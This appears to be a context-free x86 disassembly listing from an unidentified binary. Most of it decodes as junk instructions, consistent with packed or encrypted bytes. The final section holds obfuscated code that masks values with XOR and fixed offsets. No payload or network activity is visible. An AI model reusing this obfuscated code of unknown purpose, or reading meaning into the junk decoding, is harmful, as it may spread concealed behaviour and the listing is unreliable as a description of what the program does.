  4059ed:	jae    0x4059b6
  4059ef:	jmp    0x12276d87
  4059f4:	dec    esp
  4059f5:	adc    al,0x6
  4059f7:	daa    
  4059f8:	cmp    eax,0x1ede2c1
  4059fd:	push   ecx
  4059fe:	stmxcsr DWORD PTR [ebp-0x3743f91b]
  405a05:	div    ch
  405a07:	sar    BYTE PTR ds:0x2b157cd1,0x7
  405a0e:	xchg   edi,eax
  405a0f:	sub    eax,0xfd1fa483
  405a14:	dec    esp
  405a15:	jo     0x405a83
  405a17:	xor    ah,BYTE PTR ds:0x826e703c
  405a1d:	aaa    
  405a1e:	arpl   di,bp
  405a20:	pusha  
  405a21:	loope  0x405a8d
  405a23:	nop
  405a24:	pop    ebx
  405a25:	inc    esi
  405a26:	push   0x5eec6572
  405a2b:	ins    BYTE PTR es:[edi],dx
  405a2c:	xor    al,0x1e
  405a2f:	stc    
  405a30:	retf   0x681a
  405a33:	rep ins BYTE PTR es:[edi],dx
  405a35:	inc    ebp
  405a36:	jg     0x405aa3
  405a38:	jbe    0x4059c3
  405a3a:	cld    
  405a3b:	xchg   ebp,eax
  405a3c:	xor    bh,ah
  405a3e:	mov    ds:0xd399d419,al
  405a43:	adc    al,0xf3
  405a45:	mov    ebx,0x1567b56f
  405a4a:	xchg   edi,eax
  405a4b:	cmp    esi,DWORD PTR [edx]
  405a4d:	push   ecx
  405a4e:	not    DWORD PTR [ebx]
  405a50:	mov    ah,0x5
  405a52:	push   0xc7a4dfa4
  405a57:	or     al,0x6b
  405a59:	ja     0x405aa6
  405a5b:	(bad)  
  405a5c:	mov    ecx,DWORD PTR [esp+esi*4-0x479bf36]
  405a63:	sub    esi,esp
  405a65:	out    0x77,al
  405a67:	data16 jl 0x4059ee
  405a6a:	aaa    
  405a6b:	mov    cl,0xa
  405a6d:	bound  ebp,QWORD PTR ds:0x7210b83f
  405a73:	(bad)  
  405a74:	in     eax,dx
  405a75:	dec    ebx
  405a76:	cmp    ebp,ebx
  405a78:	aad    0xc4
  405a7a:	inc    esi
  405a7b:	jno    0x405ae6
  405a7d:	cmp    dl,BYTE PTR [edi]
  405a7f:	stc    
  405a80:	xor    eax,0x35f9643b
  405a85:	fild   DWORD PTR [edx]
  405a87:	ja     0x405a68
  405a89:	push   ecx
  405a8a:	mov    cl,0xc0
  405a8c:	hlt    
  405a8d:	enter  0x7550,0x3f
  405a91:	push   edi
  405a92:	cmp    ah,BYTE PTR [ecx-0x18cc585e]
  405a98:	dec    BYTE PTR [ecx+0x4365cf60]
  405a9e:	xchg   BYTE PTR [edi-0x4],al
  405aa1:	out    0xd8,al
  405aa3:	sar    ch,cl
  405aa5:	sub    bh,dl
  405aa7:	pop    es
  405aa8:	(bad)
  405aab:	test   eax,0x2bad7204
  405ab0:	enter  0x270a,0xa4
  405ab4:	loopne 0x405a4c
  405ab6:	jmp    0x93e58440
  405abb:	mov    edi,0x86c97153
  405ac0:	idiv   ecx
  405ac2:	pop    ebx
  405ac3:	into   
  405ac4:	in     eax,dx
  405ac5:	push   ecx
  405ac6:	shr    DWORD PTR [edx+0xd],1
  405ac9:	shr    edi,0xc4
  405acc:	mov    dh,0xf9
  405ace:	sbb    ch,BYTE PTR [edx+0x44]
  405ad1:	sbb    al,0xc5
  405ad3:	xor    eax,0x4f78e7c1
  405ad8:	lahf   
  405ad9:	xor    DWORD PTR [ecx+edx*1-0x688662f3],0x64
  405ae1:	adc    al,0xed
  405ae3:	fst    DWORD PTR [eax+eiz*4]
  405ae6:	ins    DWORD PTR es:[edi],dx
  405ae7:	dec    ecx
  405ae8:	jnp    0x405a85
  405aea:	shl    BYTE PTR [esi],cl
  405aec:	jp     0x405adf
  405aee:	neg    BYTE PTR [ebp+0x1cadc5b]
  405af4:	fsubr  QWORD PTR [ebx+ecx*4+0x29]
  405af8:	mov    eax,0x8ec757eb
  405afd:	and    dh,BYTE PTR [ecx+0x66]
  405b00:	pop    edx
  405b01:	out    dx,al
  405b02:	adc    BYTE PTR [eax-0x49],dl
  405b05:	jno    0x405aa9
  405b07:	and    al,0x87
  405b09:	(bad)  
  405b0a:	jnp    0x405b64
  405b0c:	je     0x405b10
  405b0e:	inc    ebp
  405b0f:	outs   dx,BYTE PTR ds:[esi]
  405b10:	inc    ebx
  405b11:	std    
  405b12:	xchg   esi,eax
  405b13:	push   ss
  405b14:	addr16 gs xor ah,0x6e
  405b19:	stos   DWORD PTR es:[edi],eax
  405b1a:	inc    eax
  405b1b:	dec    eax
  405b1c:	in     al,0x3e
  405b1e:	sbb    bl,BYTE PTR [edi+0x78a6dc4e]
  405b24:	mov    edx,0x4b735d5d
  405b29:	dec    ebp
  405b2a:	out    dx,eax
  405b2b:	add    al,0xba
  405b2d:	loope  0x405aed
  405b2f:	je     0x405b8b
  405b31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b32:	push   esi
  405b33:	test   BYTE PTR [eax-0x10396c94],ch
  405b39:	jg     0x405ac7
  405b3b:	dec    esp
  405b3c:	movd   mm4,DWORD PTR [edx-0x10]
  405b40:	cld    
  405b41:	jl     0x405b6a
  405b43:	mov    ds:0xe3551e27,al
  405b48:	and    ecx,DWORD PTR [edx]
  405b4a:	je     0x405b6e
  405b4c:	push   0x6fa67d8f
  405b51:	cs jp  0x405b4f
  405b54:	popf   
  405b55:	xchg   ecx,eax
  405b56:	mov    dl,0x79
  405b58:	mov    ?,WORD PTR [eax]
  405b5a:	or     al,0x82
  405b5c:	ret    
  405b5d:	add    eax,DWORD PTR [esi-0x4197c478]
  405b63:	not    DWORD PTR [edx+0x35]
  405b66:	mov    bl,0x3f
  405b68:	fcomp  DWORD PTR [eax]
  405b6a:	btr    DWORD PTR [edi],esp
  405b6d:	add    DWORD PTR [esi+0x62],edi
  405b70:	aam    0x28
  405b72:	sub    eax,0x1d7d2d60
  405b77:	push   edi
  405b78:	shr    cl,cl
  405b7a:	cmp    eax,0x5724c4d8
  405b7f:	xor    al,0x4c
  405b81:	push   edx
  405b82:	(bad)  
  405b83:	dec    esi
  405b84:	fild   QWORD PTR [ecx-0x427bab3f]
  405b8a:	mov    ebp,0xa6d70faa
  405b8f:	sub    eax,0x6e07098c
  405b94:	cli    
  405b95:	xchg   ecx,eax
  405b96:	das    
  405b97:	sbb    ebx,DWORD PTR [edi]
  405b99:	pop    ebx
  405b9a:	test   eax,0x810b8a62
  405b9f:	sbb    eax,0x4c192b2
  405ba4:	(bad)  
  405ba5:	cld    
  405ba6:	loop   0x405b89
  405ba8:	(bad)  
  405baa:	mov    cl,BYTE PTR [ebp-0x2a]
  405bad:	ret    
  405bae:	add    eax,edi
  405bb0:	pusha  
  405bb1:	or     dh,ah
  405bb3:	sbb    BYTE PTR [ebx+0x40],ch
  405bb6:	xlat   BYTE PTR ds:[ebx]
  405bb7:	jp     0x405c2f
  405bb9:	stc    
  405bba:	inc    ecx
  405bbb:	mov    WORD PTR [esi-0x2e678dc4],ss
  405bc1:	sub    sp,di
  405bc4:	push   0x3bff56a9
  405bc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bca:	or     eax,0x6b2eef6d
  405bcf:	adc    al,0xe1
  405bd1:	in     eax,0xb
  405bd3:	popa   
  405bd4:	xchg   ecx,eax
  405bd5:	adc    ebp,ebx
  405bd7:	and    al,0x73
  405bd9:	jmp    0x5f03:0xb0126d1
  405be0:	imul   edi,DWORD PTR ss:[esi],0xffffff80
  405be4:	bound  ecx,QWORD PTR [ecx+eax*2]
  405be7:	mov    DWORD PTR [edi-0x2d],eax
  405bea:	stc    
  405beb:	mov    edi,0xccff5f0b
  405bf0:	dec    eax
  405bf1:	push   edx
  405bf2:	or     al,bl
  405bf4:	pop    ebx
  405bf5:	sub    ebx,eax
  405bf7:	sub    eax,eax
  405bf9:	js     0x405bdd
  405bfb:	jno    0x405bad
  405bfd:	fild   QWORD PTR [ecx+0x2fdceb7d]
  405c03:	cmp    eax,0xffea3543
  405c08:	and    ebp,DWORD PTR [esi-0x80]
  405c0b:	repnz mov ds:0x964a949b,al
  405c11:	xor    edi,DWORD PTR [ebx+0x7221f4fb]
  405c17:	inc    esi
  405c18:	push   0x7db7e62e
  405c1d:	xchg   ebp,eax
  405c1e:	push   eax
  405c1f:	pushf  
  405c20:	and    BYTE PTR [esi-0x256e2ea7],0x27
  405c27:	test   BYTE PTR [ecx+0x4c],0x4e
  405c2b:	or     al,0x16
  405c2d:	pop    eax
  405c2e:	add    eax,esi
  405c30:	pop    ecx
  405c31:	dec    edx
  405c32:	(bad)  
  405c33:	xor    DWORD PTR [edx-0x290eaeda],esi
  405c39:	bound  ecx,QWORD PTR [ebp-0x3e]
  405c3c:	shl    DWORD PTR [esi-0x5a3e2c1],0x10
  405c43:	jns    0x405c78
  405c45:	jmp    0xa064b012
  405c4a:	es pop edx
  405c4c:	pop    edi
  405c4d:	jp     0x405c66
  405c4f:	inc    ecx
  405c50:	inc    esi
  405c51:	jae    0x405c08
  405c53:	jbe    0x405c5b
  405c55:	test   BYTE PTR [ebx+0x38],0x94
  405c59:	mov    DWORD PTR [edx],ebx
  405c5b:	xchg   si,ax
  405c5d:	mov    dh,0x20
  405c5f:	xlat   BYTE PTR ds:[ebx]
  405c60:	and    eax,0xadd76064
  405c65:	adc    eax,0x84a0228b
  405c6a:	pop    edi
  405c6b:	in     al,0x91
  405c6d:	mov    al,0xa1
  405c6f:	or     eax,0x46c052aa
  405c74:	mov    edx,0x9cce015b
  405c79:	cmp    eax,ecx
  405c7b:	or     BYTE PTR [esi],dh
  405c7d:	retf   
  405c7e:	loope  0x405c21
  405c80:	or     DWORD PTR [edi+0x7f],0x3c
  405c84:	lea    esi,[ebx-0x25f7bccc]
  405c8a:	imul   ebp,edi,0x32ce5d66
  405c90:	mov    WORD PTR [esi+0x5f],?
  405c93:	sub    DWORD PTR [esi-0x5f],0x9aa7a44b
  405c9a:	fidiv  WORD PTR [edx]
  405c9c:	sbb    DWORD PTR [ecx+0x10],0x5f6114cb
  405ca3:	dec    ecx
  405ca4:	and    BYTE PTR [eax-0x2f64774f],dh
  405caa:	mov    ?,edi
  405cac:	push   esp
  405cad:	mov    ds:0xcfed5136,al
  405cb2:	cmp    DWORD PTR [eax+0x3280b0da],ebx
  405cb8:	mov    dl,0x8f
  405cba:	sub    edx,ebx
  405cbc:	and    BYTE PTR cs:[edx+0x26],bh
  405cc0:	fs push cs
  405cc2:	push   ecx
  405cc3:	es imul esi,esi,0x32
  405cc7:	xor    DWORD PTR [ebx],0xffffffca
  405cca:	mov    esp,0xe8044eb5
  405ccf:	push   ecx
  405cd0:	in     al,0xc9
  405cd2:	cdq    
  405cd3:	mov    dh,0x95
  405cd5:	mov    esi,0xe7b1a8d7
  405cda:	mov    cl,0x57
  405cdc:	lock xchg ch,dh
  405cdf:	and    al,0x66
  405ce1:	fadd   DWORD PTR [ecx+edx*8+0x229c6dd6]
  405ce8:	das    
  405ce9:	cld    
  405cea:	(bad)  
  405ceb:	call   DWORD PTR [edx+eax*2]
  405cee:	add    al,0x95
  405cf0:	mov    cl,0xc3
  405cf2:	dec    edi
  405cf3:	cmp    ecx,DWORD PTR [ecx-0x7c]
  405cf6:	and    BYTE PTR [edi+0x757ae936],ah
  405cfc:	xor    edx,DWORD PTR [ecx]
  405cfe:	test   DWORD PTR [eax],edi
  405d00:	inc    ebp
  405d01:	call   0x4864:0xcbd91ca6
  405d08:	sub    BYTE PTR [eax-0x4e],0x99
  405d0c:	xchg   BYTE PTR [ebx-0x5f],dh
  405d0f:	cmp    eax,0x95e9a025
  405d14:	repnz es sahf 
  405d17:	pop    ss
  405d18:	je     0x405d68
  405d1a:	inc    eax
  405d1b:	inc    edx
  405d1c:	out    0xec,eax
  405d1e:	xchg   edi,eax
  405d1f:	jp     0x405d21
  405d21:	dec    esi
  405d22:	push   esp
  405d23:	iret   
  405d24:	mov    al,ds:0xdc26f9f0
  405d29:	enter  0x4ad0,0x72
  405d2d:	test   BYTE PTR [esp+ebp*4+0x23],ah
  405d31:	and    al,0xb5
  405d33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d34:	rcl    DWORD PTR [eax+ebp*1+0x7421f506],cl
  405d3b:	shr    DWORD PTR cs:[esi+0x2b],0x68
  405d40:	lods   eax,DWORD PTR ds:[esi]
  405d41:	test   ebx,ecx
  405d43:	mov    ebx,0xe1e09ae8
  405d48:	outs   dx,DWORD PTR ds:[esi]
  405d49:	aaa    
  405d4a:	inc    eax
  405d4b:	bound  edi,QWORD PTR [eax+0x7d]
  405d4e:	loopne 0x405d25
  405d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d51:	(bad)  
  405d52:	popf   
  405d53:	jp     0x405d0d
  405d55:	mov    ch,0x37
  405d57:	mov    ds:0xcfc2d9cd,eax
  405d5c:	sahf   
  405d5d:	bound  ecx,QWORD PTR [ebx+eax*1]
  405d60:	daa    
  405d61:	xor    DWORD PTR [edi],ecx
  405d63:	dec    ecx
  405d64:	imul   edx,DWORD PTR [ecx-0x37],0xd0a27ba2
  405d6b:	or     eax,0xf70d141b
  405d70:	dec    edi
  405d71:	cdq    
  405d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d73:	add    eax,DWORD PTR [ecx-0x53f5bfb3]
  405d79:	scas   eax,DWORD PTR es:[edi]
  405d7a:	xchg   edi,eax
  405d7b:	sub    cl,BYTE PTR [edx-0x4d4cf7b5]
  405d81:	mov    ds:0xb7d600d0,al
  405d86:	mov    bl,bl
  405d88:	scas   eax,DWORD PTR es:[edi]
  405d89:	adc    DWORD PTR [esi],ecx
  405d8b:	add    BYTE PTR [ebx-0x7b],cl
  405d8e:	rcl    BYTE PTR [edx-0x25155ef8],0x15
  405d95:	add    al,0xb8
  405d97:	jb     0x405dd8
  405d99:	mov    ds:0x958946de,al
  405d9e:	and    al,0xba
  405da0:	sub    DWORD PTR [ecx],ebp
  405da2:	or     eax,0xf6e8b5ec
  405da7:	jb     0x405d82
  405da9:	jmp    0x405e18
  405dab:	pop    es
  405dac:	icebp  
  405dad:	(bad)  
  405dae:	mov    edx,eax
  405db0:	aas    
  405db1:	xor    eax,0xf5d966de
  405db6:	push   ss
  405db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405db8:	ins    DWORD PTR es:[edi],dx
  405db9:	int    0xd4
  405dbb:	lock xchg edx,eax
  405dbd:	xchg   bl,ah
  405dbf:	clc    
  405dc0:	loopne 0x405dff
  405dc2:	dec    ecx
  405dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dc5:	les    esi,FWORD PTR [ebp+0x8]
  405dc8:	call   0x8733002b
  405dcd:	sub    eax,0x4b91ad9a
  405dd2:	test   DWORD PTR [edi+0x6d1d60c2],ebx
  405dd8:	cmp    DWORD PTR [esi+0x50],ecx
  405ddb:	pop    esp
  405ddc:	mov    dl,0x7e
  405dde:	rol    eax,cl
  405de0:	pop    ecx
  405de1:	stos   DWORD PTR es:[edi],eax
  405de2:	pusha  
  405de3:	push   edi
  405de4:	lock add BYTE PTR [eax-0x46],al
  405de8:	addr16 jns 0x405e00
  405deb:	adc    al,0x5
  405ded:	cmp    ebx,edi
  405def:	mov    ch,0x99
  405df1:	(bad)  
  405df2:	sbb    DWORD PTR ds:[eax+eax*4+0x4a91be09],ebx
  405dfa:	pop    DWORD PTR [ebx+edi*1-0x42]
  405dfe:	stos   DWORD PTR es:[edi],eax
  405dff:	enter  0x65f5,0x4b
  405e03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e04:	sub    esi,DWORD PTR [edi-0xd2ceb5b]
  405e0a:	cs test eax,0x2f6e06a
  405e10:	cmp    bh,BYTE PTR [ebp+0x56]
  405e13:	cmp    ebp,edi
  405e15:	(bad)  
  405e16:	xchg   ebp,eax
  405e17:	pop    ds
  405e18:	dec    esp
  405e19:	cli    
  405e1a:	fs xchg edx,eax
  405e1c:	call   0xd23d8c39
  405e21:	cmp    BYTE PTR ds:0x24fe0203,cl
  405e27:	cwde   
  405e28:	jb     0x405e75
  405e2a:	cmp    BYTE PTR [ecx+0x6c],0x8a
  405e2e:	mov    ah,0xcf
  405e30:	jecxz  0x405e96
  405e32:	std    
  405e33:	cmp    dl,BYTE PTR [edx]
  405e35:	jb     0x405e00
  405e37:	xor    edi,0x62052ca3
  405e3d:	fisub  DWORD PTR [ebp+0x0]
  405e40:	or     eax,esp
  405e42:	stos   DWORD PTR es:[edi],eax
  405e43:	sbb    BYTE PTR [esi-0x29d614b5],dh
  405e49:	mov    edi,0x9bfa9476
  405e4e:	pushf  
  405e4f:	jecxz  0x405ec1
  405e51:	retf   0xa557
  405e54:	adc    ah,BYTE PTR [ecx-0x73d0a006]
  405e5a:	in     eax,0x2f
  405e5c:	dec    esi
  405e5d:	mov    ch,BYTE PTR [edx]
  405e5f:	shr    DWORD PTR [eax+0x3d],1
  405e62:	xchg   DWORD PTR [esi-0x6e],eax
  405e65:	ficomp WORD PTR [edi]
  405e67:	xchg   ebx,eax
  405e68:	aam    0xb9
  405e6a:	cmp    BYTE PTR [esi-0x16],0xe7
  405e6e:	dec    ecx
  405e6f:	ins    BYTE PTR es:[edi],dx
  405e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e71:	push   ss
  405e72:	or     BYTE PTR [eax+0x12],dl
  405e75:	cmp    edx,edx
  405e77:	jle    0x405e06
  405e79:	les    eax,FWORD PTR [esi]
  405e7b:	cmp    bl,0xd2
  405e7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e7f:	int3   
  405e80:	jmp    0x405e1a
  405e82:	ja     0x405ef6
  405e84:	xchg   edi,eax
  405e85:	fisub  DWORD PTR [edi]
  405e87:	xor    ah,BYTE PTR [eax]
  405e89:	push   cs
  405e8a:	ret    0x180e
  405e8d:	(bad)  [eax+0x4f]
  405e90:	into   
  405e91:	or     ebx,DWORD PTR ds:0x68669c4e
  405e97:	push   0x6b8c4b34
  405e9c:	dec    edi
  405e9d:	ror    DWORD PTR [esp+ebx*8-0x77039342],cl
  405ea4:	jecxz  0x405f13
  405ea6:	or     DWORD PTR [esi],esp
  405ea8:	and    eax,ebx
  405eaa:	mov    al,0x95
  405eac:	inc    esp
  405ead:	mov    esp,0x8c12ccd2
  405eb2:	push   0xffffffe6
  405eb4:	mov    bl,0xa3
  405eb6:	mov    dh,0xb4
  405eb8:	push   ss
  405eb9:	push   ebp
  405eba:	pop    esp
  405ebb:	pop    ebx
  405ebc:	inc    edi
  405ebd:	mov    ch,BYTE PTR [eax-0x61]
  405ec0:	sub    ebp,DWORD PTR [edi]
  405ec2:	mov    ch,0x64
  405ec4:	mov    ecx,0xbd576cf4
  405ec9:	adc    DWORD PTR [edx],eax
  405ecb:	pop    ebx
  405ecc:	dec    ecx
  405ecd:	and    ah,dl
  405ecf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ed0:	sbb    DWORD PTR [edi+eax*1],0xffffff86
  405ed4:	dec    esp
  405ed5:	test   eax,0x460076c4
  405eda:	xchg   esi,edi
  405edc:	leave  
  405edd:	inc    eax
  405ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405edf:	clc    
  405ee0:	and    bh,BYTE PTR [ebp+0x49]
  405ee3:	fisttp WORD PTR [esi+0x7f9b4189]
  405ee9:	shr    DWORD PTR [edx+0x6f],cl
  405eec:	imul   edi,esp,0xd5473fd1
  405ef2:	les    edx,FWORD PTR [ebx]
  405ef4:	jle    0x405e77
  405ef6:	fsub   QWORD PTR ds:[ecx+0x5f]
  405efa:	test   DWORD PTR [edi+eiz*2+0x7dacf64e],ecx
  405f01:	xor    DWORD PTR [ebp+0x30e3cd93],edi
  405f07:	sbb    DWORD PTR [ebp-0x274d8f0],ebp
  405f0d:	dec    edx
  405f0e:	(bad)  
  405f0f:	into   
  405f10:	mov    ah,bl
  405f12:	and    dh,BYTE PTR [esi-0x5e]
  405f15:	jb     0x405edf
  405f17:	jl     0x405ecc
  405f19:	adc    eax,0x7b7904e5
  405f1e:	es or  eax,0x655fb8d9
  405f24:	lahf   
  405f25:	pusha  
  405f26:	mov    esi,0xc342f05e
  405f2b:	aam    0xc9
  405f2d:	mov    cl,0xc7
  405f2f:	add    BYTE PTR [ecx],0x1d
  405f32:	ja     0x405f45
  405f34:	repz push esi
  405f36:	pop    eax
  405f37:	add    BYTE PTR [eax],ah
  405f39:	adc    eax,DWORD PTR [edi]
  405f3b:	enter  0xb3f7,0xda
  405f3f:	lahf   
  405f40:	jne    0x405f63
  405f42:	dec    esi
  405f43:	scas   eax,DWORD PTR es:[edi]
  405f44:	jae    0x405f95
  405f46:	inc    edx
  405f47:	adc    eax,0x6013b8ef
  405f4c:	add    eax,0x5a13cde1
  405f51:	cmp    ebx,DWORD PTR [ebx*8+0x168df171]
  405f58:	ret    0xab44
  405f5b:	lea    eax,[ecx+0x22]
  405f5e:	push   esp
  405f5f:	fcmovnu st,st(3)
  405f61:	scas   eax,DWORD PTR es:[edi]
  405f62:	enter  0xca9e,0x86
  405f66:	push   esi
  405f67:	pop    esi
  405f68:	fwait
  405f69:	mov    ebx,0x353ed0ec
  405f6e:	dec    edx
  405f6f:	and    DWORD PTR [ecx-0x28],0x7e
  405f73:	inc    esi
  405f74:	sbb    eax,0x33c3d05f
  405f79:	shr    BYTE PTR [esi+0x30],1
  405f7c:	test   eax,0x41934a81
  405f81:	(bad)  
  405f82:	and    esi,DWORD PTR [esi+0x4b]
  405f85:	inc    esp
  405f86:	jl     0x405f7b
  405f88:	aad    0x32
  405f8a:	jo     0x405f62
  405f8c:	not    DWORD PTR [edi-0x39]
  405f8f:	fldpi  
  405f91:	jp     0x405f52
  405f93:	int3   
  405f94:	outs   dx,BYTE PTR ds:[esi]
  405f95:	in     eax,dx
  405f96:	bound  esi,QWORD PTR [esp+eax*8-0x7e]
  405f9a:	add    al,BYTE PTR [ecx]
  405f9c:	push   0xa812806e
  405fa1:	inc    edi
  405fa2:	and    eax,0x13e76309
  405fa7:	push   ebx
  405fa8:	xchg   esi,eax
  405fa9:	push   esp
  405faa:	mov    dh,0x6a
  405fac:	data16 (bad) 
  405fae:	push   edi
  405faf:	fnstenv [edi]
  405fb1:	mov    ds:0x721602ce,al
  405fb6:	lods   al,BYTE PTR ds:[esi]
  405fb7:	pop    ebp
  405fb8:	adc    BYTE PTR [edx+edx*8-0x5b],dh
  405fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fbd:	scas   al,BYTE PTR es:[edi]
  405fbe:	pop    ds
  405fbf:	inc    edi
  405fc0:	adc    eax,0xf7e52594
  405fc5:	data16 cmp bh,BYTE PTR [esi]
  405fc8:	mov    ebx,0xd7a3d238
  405fcd:	and    al,0xdf
  405fcf:	mov    WORD PTR [edi+0x1f],ss
  405fd2:	cmp    al,0xb9
  405fd4:	jp     0x406004
  405fd6:	shr    ch,1
  405fd8:	jne    0x405fad
  405fda:	retf   
  405fdb:	jb     0x406012
  405fdd:	fnstcw WORD PTR [eax]
  405fdf:	ror    DWORD PTR [ebx+0x4a],cl
  405fe2:	inc    eax
  405fe3:	xor    eax,0x9eb9618f
  405fe8:	shr    DWORD PTR [ebx],0xaa
  405feb:	cmp    ah,BYTE PTR [eax-0x6e3af309]
  405ff1:	sbb    esp,ebx
  405ff3:	adc    edx,DWORD PTR [eax+0x5933ede]
  405ff9:	fcomi  st,st(4)
  405ffb:	add    edx,DWORD PTR [ebx-0x28]
  405ffe:	mov    dh,0x4
  406000:	lea    ebx,[esi-0x7f1c3636]
  406006:	int    0x1e
  406008:	push   edx
  406009:	imul   esp,edi,0x98818267
  40600f:	dec    edi
  406010:	sar    DWORD PTR [ecx+0x5d698db6],cl
  406016:	and    edx,edx
  406018:	fbld   TBYTE PTR [esp+ebp*8]
  40601b:	ret    0x58ee
  40601e:	jo     0x40606b
  406020:	jmp    0x406044
  406022:	ficomp DWORD PTR [eax+ebx*8]
  406025:	scas   al,BYTE PTR es:[edi]
  406026:	and    DWORD PTR [ebp+0x15],0x6f993be9
  40602d:	sub    eax,0xbb13674b
  406032:	fwait
  406033:	mov    dh,BYTE PTR [eax+0x776632d4]
  406039:	and    eax,DWORD PTR [ebx+0x34d763ed]
  40603f:	sub    eax,0xb0674e9
  406044:	int3   
  406045:	hlt    
  406046:	cli    
  406047:	mov    bh,0xf5
  406049:	outs   dx,BYTE PTR ds:[esi]
  40604a:	jno    0x405fda
  40604c:	mov    esp,0x7d535a56
  406051:	jb     0x406039
  406053:	loop   0x40609d
  406055:	sub    dh,BYTE PTR [ebp+ecx*1+0x17]
  406059:	and    dl,al
  40605b:	xor    DWORD PTR [esi-0x70ecebcb],edi
  406061:	push   0x3bf63921
  406066:	dec    eax
  406067:	enter  0xaa86,0xd
  40606b:	xchg   edi,eax
  40606c:	ret    
  40606d:	cmc    
  40606e:	xchg   esi,eax
  40606f:	imul   ebp,DWORD PTR [ebp+0x11],0xadac8889
  406076:	mov    esp,DWORD PTR ds:[ecx]
  406079:	shl    bl,1
  40607b:	hlt    
  40607c:	mov    WORD PTR [esi+ebp*2+0x1f0ea142],?
  406083:	ret    
  406084:	mov    ecx,0xa617e740
  406089:	lods   eax,DWORD PTR ds:[esi]
  40608a:	sbb    dh,BYTE PTR ds:0x4fe8bb99
  406090:	jge    0x40608f
  406092:	push   eax
  406093:	adc    eax,0x8dd9f4c5
  406098:	xor    BYTE PTR [eax+0x68],cl
  40609b:	add    dl,al
  40609d:	push   eax
  40609e:	pop    ebx
  40609f:	out    0xb2,al
  4060a1:	mov    es,ebp
  4060a3:	shl    BYTE PTR [ecx+0x728c65be],1
  4060a9:	xor    DWORD PTR [edi-0x75],ebx
  4060ac:	fisubr WORD PTR [esi-0x545261f0]
  4060b2:	mov    edx,0xcae96bcb
  4060b7:	cwde   
  4060b8:	push   eax
  4060b9:	cmc    
  4060ba:	add    al,0x49
  4060bc:	fmul   st,st(3)
  4060be:	mov    eax,DWORD PTR [ebp-0xd]
  4060c1:	outs   dx,DWORD PTR ds:[esi]
  4060c2:	pop    ebx
  4060c3:	mov    gs,WORD PTR [ecx-0xfd1d12a]
  4060c9:	mov    bl,0x35
  4060cb:	add    BYTE PTR [ebx+ebp*1],dh
  4060ce:	std    
  4060cf:	inc    edi
  4060d0:	fnsave [eax]
  4060d2:	jmp    0xf00c7554
  4060d7:	xchg   edx,eax
  4060d8:	jle    0x406128
  4060da:	dec    edi
  4060db:	push   ebp
  4060dc:	pop    esp
  4060dd:	ss jns 0x4060b6
  4060e0:	je     0x4060e2
  4060e2:	out    dx,al
  4060e3:	xchg   ecx,eax
  4060e4:	cmp    BYTE PTR [edx],0xc2
  4060e7:	ins    DWORD PTR es:[edi],dx
  4060e8:	jl     0x40608a
  4060ea:	mov    ds:0x3ef32ba3,eax
  4060ef:	pop    esi
  4060f0:	fild   DWORD PTR [ebx-0x3c5ed38a]
  4060f6:	pop    esp
  4060f7:	(bad)  
  4060f8:	cli    
  4060f9:	dec    edx
  4060fa:	adc    al,0xb9
  4060fc:	mov    al,ds:0x1fa29338
  406101:	jbe    0x406158
  406103:	inc    esp
  406104:	or     ebp,0x1a04885f
  40610a:	mov    eax,DWORD PTR [ebp-0x40]
  40610d:	mov    edx,DWORD PTR [ebp-0x28]
  406110:	xor    eax,esi
  406112:	xor    edx,esi
  406114:	add    eax,edi
  406116:	add    edx,edi
  406118:	imul   eax,edx
  40611b:	add    eax,DWORD PTR [ebp-0xc]
  40611e:	mov    DWORD PTR [ebp-0xc],eax
  406121:	mov    eax,DWORD PTR [ebp-0xc]
  406124:	mov    edx,DWORD PTR [ebp-0x18]
  406127:	cmp    edx,eax
  406129:	jb     0x403ce7
  40612f:	mov    eax,DWORD PTR [ebp-0x28]
  406132:	mov    edx,DWORD PTR [ebp-0x18]
  406135:	xor    eax,esi
  406137:	add    eax,edi
  406139:	imul   eax,edx
  40613c:	mov    edx,DWORD PTR [ebp-0x1c]
  40613f:	xor    edx,esi
  406141:	add    edx,edi
  406143:	or     eax,edx
  406145:	mov    edx,DWORD PTR [ebp-0x20]
  406148:	xor    edx,esi
  40614a:	add    eax,edx
  40614c:	mov    edx,DWORD PTR [ebp-0x20]
  40614f:	xor    edx,esi
  406151:	add    eax,edx
  406153:	mov    edx,DWORD PTR [ebp-0x10]
  406156:	lea    eax,[eax+edx*1+0x64e5ea]
  40615d:	jmp    0x406171
  406162:	mov    eax,DWORD PTR [ebp-0x20]
  406165:	mov    edx,DWORD PTR [ebp-0x10]
  406168:	xor    eax,esi
  40616a:	lea    eax,[eax+edx*1+0x3272f5]
  406171:	mov    DWORD PTR [ebp-0x10],eax
  406174:	jmp    0x403c34
  406179:	mov    ebx,DWORD PTR [ebp-0x3c]
  40617c:	mov    eax,DWORD PTR [ebp+0xc]
  40617f:	xor    eax,esi
  406181:	lea    ecx,[ecx+eax*1+0x3272f5]
  406188:	lea    eax,[ecx-0x3272f5]
  40618e:	xor    eax,esi
  406190:	cmp    eax,0xf89c95a5
  406195:	jne    0x401883
  40619b:	dec    DWORD PTR [ebp-0x34]
  40619e:	jne    0x401877
  4061a4:	mov    eax,DWORD PTR [ebp+0x8]
  4061a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4061aa:	mov    edx,DWORD PTR [ebp+0x8]
  4061ad:	xor    ecx,esi
  4061af:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f5]
  4061b6:	xor    eax,esi
  4061b8:	mov    al,BYTE PTR [eax+ebx*1+0x3272f5]
  4061bf:	xor    edx,esi
  4061c1:	mov    BYTE PTR [edx+ebx*1+0x3272f5],cl
